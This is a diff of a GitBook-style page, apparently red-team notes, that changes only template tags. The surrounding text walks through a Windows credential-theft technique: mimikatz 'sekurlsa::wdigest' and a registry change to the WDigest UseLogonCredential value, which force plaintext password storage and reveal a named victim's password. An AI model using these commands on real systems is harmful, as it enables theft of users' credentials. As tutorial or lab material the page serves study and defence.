@@ -8,13 +8,13 @@ It is still possible, however, to force WDigest to store secrets in plaintext.
 
 Let's first make sure that wdigest is not storing credentials in plaintext on our target machine running Windows 10:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```csharp
 sekurlsa::wdigest
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Note the password field is null:
 
@@ -22,25 +22,25 @@ Note the password field is null:
 
 Now as an attacker, we can modify the following registry key to force the WDigest to store credentials in plaintext next time someone logs on to the target system:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```csharp
 reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/mimikatz-2.2.0-x64-oe.eo-5_13_2019-10_44_54-pm.png)
 
 Say, now the victim on the target system spawned another shell:
 
-{% code-tabs %}
-{% code-tabs-item title="victim@local" %}
+{% tabs %}
+{% tab title="victim@local" %}
 ```csharp
 runas /user:mantvydas powershell
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Running mimikatz for wdigest credentials now reveals the plaintext password of the victim user `mantvydas`:
 
